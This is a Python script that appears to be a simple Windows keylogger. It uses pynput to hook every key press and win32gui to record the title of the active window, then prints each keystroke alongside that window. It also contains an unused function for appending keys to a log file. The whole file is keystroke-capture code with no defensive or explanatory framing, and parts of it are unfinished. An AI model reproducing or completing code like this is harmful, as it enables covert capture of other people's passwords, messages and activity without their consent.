from pynput.keyboard import Key, Listener

import logging

from win32gui import GetWindowText, GetForegroundWindow
GetWindowText(GetForegroundWindow())

logger = logging.getLogger("Shithead")
count=0
keys=[]
lastactivewindow=GetWindowText(GetForegroundWindow())
if lastactivewindow[0]=='●':
        lastactivewindow=lastactivewindow[2:]

splitterCount= lastactivewindow.count('-')
if lastactivewindow.count('-')==0:
    lastApp=lastactivewindow
else:
    lastApp=lastactivewindow.split('-')[splitterCount]

def on_press(key):
    global keys,count,lastactivewindow,lastApp,logger
    currentactiveMenu=GetWindowText(GetForegroundWindow())
    if currentactiveMenu[0]=='●':
        currentactiveMenu=currentactiveMenu[2:]

    if currentactiveMenu!=lastactivewindow:
        print(currentactiveMenu)
        print("-"*50)
        lastactivewindow=currentactiveMenu

    print("{0}pressed".format(key)) 

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            f.write(key)

def on_release(key):
    if key== Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

    
